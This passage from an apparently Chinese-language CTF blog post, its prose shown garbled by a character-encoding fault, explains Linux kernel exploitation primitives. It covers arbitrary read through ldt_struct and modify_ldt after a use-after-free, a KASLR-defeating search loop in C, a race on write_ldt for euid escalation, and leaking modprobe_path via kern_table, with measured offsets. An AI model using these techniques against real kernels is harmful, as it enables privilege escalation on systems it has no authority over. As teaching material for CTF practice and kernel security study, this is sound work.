&#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚æœ‰ä¸ªUAFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©è¯¥å‡½æ•°ï¼Œç”³è¯·0x10å¤§å°çš„å †å—ï¼Œä¿®æ”¹å…¶<code>entries</code>æŒ‡é’ˆï¼Œå†å€ŸåŠ©<code>read_ldt</code>å‡½æ•°è¿›è¡Œè¯»å–</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">    <span class="comment">//entries_sizeè‚¯å®šå¤§äº8192,é‚£ä¹ˆè‡³å°‘å¯æ‹·è´8192ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="comment">//#define LDT_ENTRIES    8192</span></span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">		entries_size = bytecount;</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//.....//</span></span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>å³è·å–å½“å‰è¿›ç¨‹ä¸­çš„<code>ldt_struct</code>ç»“æ„ä½“çš„<code>entries</code>æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼Œæ‹·è´<code>bytecount</code>ä¸ªå­—èŠ‚ç»™ç”¨æˆ·</li>
</ul>
<p>é‚£ä¹ˆå½“å¦‚ä¸Šè¿°æ‰€ç¤ºï¼Œå€ŸåŠ©UAFä¿®æ”¹äº†<code>entries</code>æŒ‡é’ˆä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„åœ°å€è¯»å–æœ€å°‘å¯åˆ°è¾¾8192ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p>
<p>å¦‚æœæ²¡æœ‰åœ°å€çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•æ¥è¯»å–å†…æ ¸åœ°å€ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰å‘½ä¸­å†…æ ¸ç©ºé—´<code>copy_to_user</code>ä¼šè¿”å›é0å€¼ï¼Œä½†æ˜¯å†…æ ¸ä¸ä¼šå´©æºƒï¼Œå€ŸåŠ©è¿™ç‚¹ç‰¹æ€§å¯ä»¥ç”¨æ¥çˆ†ç ´å†…æ ¸ç©ºé—´ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå­˜åœ¨<code>harden_usercopy</code>å’Œ<code>KASLR</code>ï¼Œæœ€å¥½è¿˜æ˜¯å€ŸåŠ©<code>page_offset_base</code>å’Œ<code>fork</code>æ¥ä»çº¿æ€§åˆ†é…åŒºä¸­æœç´¢æ•°æ®ï¼Œä¸ç„¶å½“<code>copy_to_user</code>çš„æºåœ°å€ä¸ºå†…æ ¸ .text æ®µï¼ˆ_stext, _etextï¼‰æ—¶æˆ–è€…çº¿æ€§åˆ†é…åŒºä¸­çš„æ•°æ®è¾ƒä¸ºç‰¹æ®Šæ—¶ä¼šå¼•èµ·<code>kernel panic</code>ï¼Œè‡´ä½¿å†…æ ¸å´©æºƒã€‚</p>
<p>åŸç†å°±æ˜¯åœ¨<code>fork</code>æ—¶æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯<code>ldt_dup_context</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰å¦‚ä¸‹æ“ä½œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br></pre></td></tr></table></div></figure>

<p>ä¼šå°†çˆ¶è¿›ç¨‹çš„æ‹·è´ç»™å­è¿›ç¨‹ï¼Œå®Œå…¨åœ¨å†…æ ¸ä¸­çš„æ“ä½œï¼Œä¸ä¼šè§¦å‘<code>hardened usercopy</code>çš„æ£€æŸ¥ï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åæ‰“å¼€å­è¿›ç¨‹æ¥é€šè¿‡<code>read_ldt()</code>è¯»å–æ•°æ®å³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset;</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"><span class="keyword">size_t</span> searchAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœç´¢page_offset_base</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.len = <span class="number">0x8</span>;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;page_offset_base;<span class="comment">//change the entries</span></span><br><span class="line">    editFun(fd,&amp;myChunk);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">//read_ldt 8 bytes form entries</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)<span class="comment">//judge yes or no</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»page_offset_baseä¸­æœç´¢å†…æ ¸å‡½æ•°åœ°å€</span></span><br><span class="line">searchAddr = page_offset_base;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;searchAddr</span><br><span class="line">    editFunc(fd, &amp;myChunk);<span class="comment">//ä¿®æ”¹entriesæŒ‡é’ˆ</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//è¯»å–0x8000æ•°æ®</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//é€‰å–ç‰¹å¾æ•°æ®</span></span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt;= <span class="number">0xffffffff81000000</span>)  &amp;&amp; ((buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x030</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = buf[i] -  <span class="number">0x030</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\033[32m\033[1m at \033[0m%p\n&quot;</span>, kernel_base, search_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br><span class="line">kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-å®ç°ä»»æ„åœ°å€å†™"   >
          <a href="#3-å®ç°ä»»æ„åœ°å€å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®ç°ä»»æ„åœ°å€å†™" class="headerlink" title="(3)å®ç°ä»»æ„åœ°å€å†™"></a>(3)å®ç°ä»»æ„åœ°å€å†™</h3>
      <p>åŒæ ·çš„è¿˜æ˜¯å…³äº<code>entries</code>æŒ‡é’ˆï¼Œå¦‚ä¸‹åœ¨<code>write_ldt</code>å‡½æ•°ä¸­çš„ä»£ç ï¼Œ<code>entry_number</code>å¯æ§ï¼Œ<code>ldt</code>ä¸å¤ªå¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆ<code>write_ldt</code>ä¸€ä¸ª<code>new_nr_entries</code>å‡ºæ¥ï¼Œç„¶åå†ä¸‹ä¸€æ¬¡<code>write_ldt</code>å°±å¯ä»¥ç»™<code>old_nr_entries</code>èµ‹å€¼ï¼Œè¿›è€Œåœ¨<code>memcpy</code>çš„æ—¶å€™æ‹·è´å¤§é‡æ•°æ®ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"><span class="comment">//...//</span></span><br><span class="line"><span class="comment">//è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ</span></span><br><span class="line"> <span class="comment">//#define LDT_ENTRY_SIZE    8</span></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®</span></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></div></figure>

<p>è€Œå¦‚æœè¿™æ—¶æœ‰ä¸ªæ¡ä»¶ç«äº‰ï¼Œåœ¨æ‹·è´è¿‡ç¨‹ä¸­å°†<code>new_ldt-&gt;entries</code>ç»™åŠ«æŒäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥å€ŸåŠ©æ‹·è´ä¹‹åçš„è¯­å¥<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>æ¥ä¾æ®<code>ldt</code>ä¿®æ”¹åŠ«æŒä¹‹åçš„<code>new_ldt-&gt;entries</code>å¯¹åº”å†…å­˜ã€‚</p>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶å¯ä»¥ä¿®æ”¹ï¼Œä½†æ˜¯å…¶å®<code>ldt</code>ç”±äºä¹‹å‰æåˆ°çš„è®¾ç½®åŸå› ï¼Œå…¶æ•°æ®ä¼šæœ‰æ‰€æ”¹å˜ï¼Œä¸å¤ªèƒ½éšæ„å¯æ§ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥è®¾ç½®4ä¸ªå­—èŠ‚çš„0æ•°æ®ï¼Œé‚£å°±å¯ä»¥è®¾ç½®å½“å‰è¿›ç¨‹çš„euidäº†ï¼Œè¿™æ ·ä¹Ÿèƒ½ææƒï¼Œä½†æ˜¯è¿˜æ²¡æ¥è§¦åˆ°æ€ä¹ˆé€šè¿‡euidè®¾ç½®æ¥ææƒã€‚</p>
<p>ä½†æ˜¯<code>arttnba3</code>å¸ˆå‚…å†™çš„ç”¨æ¥ä¿®æ”¹euidä¹‹åè°ƒç”¨<code>seteuid</code>çš„æ–¹æ³•å¥½ä½¿ï¼Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦çš„æ•°æ®ä¸ç”¨å¤ªä¸¥è‹›å—?ä¸å¤ªæ¸…æ¥šå“ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">desc.base_addr = <span class="number">0</span>;</span><br><span class="line">desc.entry_number = <span class="number">2</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span> ;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br></pre></td></tr></table></div></figure>




        <h2 id="5-kern-tableæ•°ç»„"   >
          <a href="#5-kern-tableæ•°ç»„" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-kern-tableæ•°ç»„" class="headerlink" title="5.kern_tableæ•°ç»„"></a>5.kern_tableæ•°ç»„</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†-1"   >
          <a href="#å‰ç½®çŸ¥è¯†-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†-1" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>è¿™ä¸ªä¸èƒ½å«ç»“æ„ä½“å§ï¼Œä¸è¿‡è¿™ä¸ªå¯ä»¥åˆ©ç”¨</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17  /kernel/sysctl.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> <span class="title">kern_table</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modprobe&quot;</span>,</span><br><span class="line">        .data		= &amp;modprobe_path,</span><br><span class="line">        .maxlen		= KMOD_PATH_LEN,</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        .proc_handler	= proc_dostring,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modules_disabled&quot;</span>,</span><br><span class="line">        .data		= &amp;modules_disabled,</span><br><span class="line">        .maxlen		= <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        <span class="comment">/* only handle a transition from default &quot;0&quot; to &quot;1&quot; */</span></span><br><span class="line">        .proc_handler	= proc_dointvec_minmax,</span><br><span class="line">        .extra1		= SYSCTL_ONE,</span><br><span class="line">        .extra2		= SYSCTL_ONE,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­åŒ…å«å¾ˆå¤š<code>/proc/sys/kernel/</code>ä¸‹çš„æ–‡ä»¶å¥æŸ„ï¼Œè¿™äº›æ˜¯åœ¨linuxå†…æ ¸å¯åŠ¨æ—¶å°±è¿›è¡Œæ˜ å°„çš„ï¼Œå’Œæ–‡ä»¶ç›¸å…³ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹è¿™äº›å¥æŸ„ï¼Œæ¯”å¦‚å°†<code>data</code>æŒ‡é’ˆä¿®æ”¹åˆ°ä»»æ„ä½ç½®ï¼Œå½“æˆ‘ä»¬æ‰“å¼€<code>/proc/sys/kernel/</code>ä¸‹å¯¹åº”çš„æ–‡ä»¶æ—¶ï¼Œå°±èƒ½ä¾æ®<code>data</code>æŒ‡é’ˆï¼Œè¯»å–åˆ°è¯¥æŒ‡é’ˆå¯¹åº”çš„æ•°æ®ã€‚</p>
<p>è€Œæˆ‘ä»¬ä¸»è¦å°±æ˜¯åˆ©ç”¨å…¶ä¸­çš„<code>CONFIG_MODULES</code>å®šä¹‰ä¸‹çš„<code>modprobe</code>ï¼Œä¹Ÿå°±æ˜¯ä»¥å‰ææƒç»å¸¸ç”¨åˆ°çš„<code>modprobe_path</code>ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ<code>modeprobe</code>è¿™ä¸ªæ–‡ä»¶æ˜ å°„å¥æŸ„å…¶ä¸­ä¿å­˜ç€<code>modprobe_path</code>è¿™ä¸ªå…¨å±€å˜é‡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png" alt="image-20220328141017757"></p>
<p>å†…å­˜åˆ†å¸ƒå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png" alt="image-20220328141220790"></p>

        <h3 id="å®ç°ä»»æ„è¯»å–"   >
          <a href="#å®ç°ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#å®ç°ä»»æ„è¯»å–" class="headerlink" title="å®ç°ä»»æ„è¯»å–"></a>å®ç°ä»»æ„è¯»å–</h3>
      
        <h4 id="å†…å­˜æ˜ å°„"   >
          <a href="#å†…å­˜æ˜ å°„" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜æ˜ å°„" class="headerlink" title="å†…å­˜æ˜ å°„"></a>å†…å­˜æ˜ å°„</h4>
      <p>é™¤äº†ä¸Šè¿°çš„å¯åŠ¨å†…æ ¸æ—¶å‘ç”Ÿæ˜ å°„å¤–ï¼Œå½“æˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶ï¼Œä¹Ÿä¼šåœ¨å†…æ ¸çš„çº¿æ€§åˆ†é…åŒº<code>page_offset_base</code>å³<code>0xffff888000000000</code>å‘ç”Ÿæ˜ å°„ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„v5.6ç‰ˆæœ¬ä¸‹çš„å†…æ ¸ï¼Œæ²¡å¼€å¯KASLRçš„æƒ…å†µä¸‹æ˜ å°„åç§»ä¸º<code>0x2444100</code>å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png" alt="image-20220328170627765"></p>
<p>å¯ä»¥çœ‹åˆ°æ•°æ®å®Œå…¨ä¸€è‡´ï¼Œè€Œç”±äºæ˜¯æ˜ å°„å…³ç³»ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹å…¶ä¸­ä¸€éƒ¨åˆ†çš„æ•°æ®æ—¶ï¼Œå¦ä¸€éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œå°è¯•ä¿®æ”¹<code>data</code>æŒ‡é’ˆä¸º<code>0xffffffff82446ab0</code>ï¼Œä¸¤è¾¹éƒ½å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png" alt="image-20220328171003365"></p>

        <h4 id="å†…å­˜å¤åˆ¶"   >
          <a href="#å†…å­˜å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜å¤åˆ¶" class="headerlink" title="å†…å­˜å¤åˆ¶"></a>å†…å­˜å¤åˆ¶</h4>
      <p>é™¤äº†å†…å­˜æ˜ å°„åŒºåŸŸä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå†…å­˜å¤åˆ¶åŒºåŸŸï¼Œä¹Ÿæ˜¯åœ¨<code>page_offset_base</code>ä¸Šï¼Œæ¯”å¦‚è¿™é‡Œçš„åç§»ä¸º<code>0xec8a440</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png" alt="image-20220328172112145"></p>
<p>å¯ä»¥çœ‹åˆ°å®Œå…¨ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºæ˜¯å¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ˜ å°„å…³ç³»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å†…å­˜æ˜ å°„çš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆæŒ‡å‘å†…å­˜å¤åˆ¶çš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆï¼Œæ‰“å¼€<code>/proc/sys/kernel/modprobe</code>æ–‡ä»¶å³å¯è·å–åˆ°å†…å­˜å¤åˆ¶åŒºåŸŸçš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆæ•°æ®ï¼Œå³<code>modprobe_path</code>çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åªæœ‰å †åœ°å€å’Œä»»æ„å†™çš„æ—¶å€™ï¼Œä¸æ³„éœ²å†…æ ¸åŸºåœ°å€çš„æƒ…å†µä¸‹ï¼Œå®Œæˆ<code>modprobe_path</code>çš„åœ°å€æ³„éœ²ã€‚</p>

        <h4 id="KASLR"   >
          <a href="#KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4>
      <p>å¦‚æœå¼€å¯äº†<code>KASLR</code>çš„è¯ï¼Œå°±æœ‰ç‚¹ä¸åŒäº†ï¼Œç”±äºæ˜¯æ–‡ä»¶å†…å­˜æ˜ å°„å’Œå¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜ å°„å’Œå¤åˆ¶çš„åç§»é‡å…¶å®æ¯”è¾ƒå–å†³äºæ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬ï¼Œå†…æ ¸çš„æ–‡ä»¶ç³»ç»Ÿæ¯”è¾ƒå¤æ‚ï¼ŒVFSæ¥å£ä¸‹å¯è¿æ¥ä¸€å †çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿåˆéƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½éœ€è¦å®é™…åˆ†æï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„æµ‹è¯•ç»“æœ</p>

        <h5 id="SVR4"   >
          <a href="#SVR4" class="heading-link"><i class="fas fa-link"></i></a><a href="#SVR4" class="headerlink" title="SVR4"></a>SVR4</h5>
      <p>è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¹Ÿå°±æ˜¯æˆ‘ä»¬kernelé¢˜ä¸­å¸¸è§çš„cpioåç¼€ä½¿ç”¨çš„ï¼Œæ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™ï¼Œæ˜ å°„å’Œå¤åˆ¶çš„åç§»éƒ½æ˜¯ç¡®å®šçš„ï¼Œå®é™…è°ƒä¸€ä¸‹ï¼Œå€Ÿç”¨pedaæ’ä»¶çš„findåŠŸèƒ½å¯ä»¥å®¹æ˜“æœç´¢åˆ°ã€‚ä½†æ˜¯å¼€å¯ä¹‹åï¼Œå¤åˆ¶çš„åç§»åŸºæœ¬ä¸ä¼šå˜åŒ–ï¼Œä½†æ˜¯æ˜ å°„çš„åç§»ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæµ‹è¯•å¤šæ¬¡å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5.6</span><br><span class="line">#modprobe_map 0x2444100</span><br><span class="line">#modprobe_map 0x6844100</span><br><span class="line">#modprobe_map 0x6c44100</span><br><span class="line">#modprobe_map 0xd244100</span><br><span class="line">#modprobe_map 0x5844100</span><br><span class="line"></span><br><span class="line">#modprobe_copy 0xec8a440</span><br></pre></td></tr></table></div></figure>

